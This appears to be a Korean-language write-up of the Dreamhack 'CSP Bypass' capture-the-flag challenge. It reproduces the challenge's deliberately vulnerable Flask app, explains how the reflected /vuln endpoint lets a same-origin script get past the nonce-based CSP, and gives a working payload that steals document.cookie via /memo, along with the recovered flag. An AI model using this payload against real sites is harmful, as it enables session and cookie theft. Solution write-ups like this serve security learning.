https://honey-push-30b.notion.site/CSP-Bypass-d43f4674d9374ce5bfc6e4579200ab69
# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/be9c0791-f58a-4f82-8cf3-4f10273ed8ab/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

CSP Bypass 문제파일을 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는XSS-1문제에서 CSP 조건만 추가된 문제로 원래는 CSP정책에 추가로 XSS 필터링이 있어야 안전하지만 XSS 필터링이 존재하지 않으므로 CSP 정책만 우회하는 방법을 생각하면 된다. 

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)
```

여전히 vuln페이지는 입력한 param값을 그대로 반환해주기 때문에 스크립트를 전달하면 그대로 실행해주는 취약점을 가지고 있고 flag 페이지를 이용하여 vuln페이지에 스크립트를 주입하여 read_flag 함수를 거쳐 cookie 값을 알아내면 된다.

# 문제 풀이

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers[		 	
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response
```

img의 경우 dreamhack.io로 고정이 되어있으므로 img 태그를 쓸 수 없고 무작위로 생성되는 nonce값으로 인해 외부에서 주입하기 힘들다.

따라서 script태그의 src를 vuln 페이지에서 접근하여 self를 위반하지 않는 같은 오리진에서 접근하며 스크립트를 로드해야한다.

이 때 같은 오리진은

그래서 <script src=”/vuln?param=location.href=’/memo?memo=’%2bdocument.cookie”></script>로 작성해주어야한다. 

script의 src 속성은 외부 스크립트 파일의 URL을 명시하고 가져온다.

![exploit.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8f08c84-8891-4b6c-af5d-2a8ebc4ca437/exploit.png)

즉 vuln페이지에 param으로 location.href=’/memo?memo=’%2bdocument.cookie를 넣어준 결과 값인 vuln페이지의 응답값을 로드한다. 이 때 script의 src로 접근한 페이지는 /vuln페이지로 같은 출처이고 %2b로 넣어준 것은 스크립트 부분은 두 단계를 거쳐 파라미터로 해석되므로 URL Decoding이 되어 공백으로 되지 않도록 해준 것이다.

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0237904a-b2ac-42dd-bf0d-2da99760c444/flag.png)

`flag=DH{81e64da19119756d725a33889ec3909c}`가 나온것을 볼 수 있다.
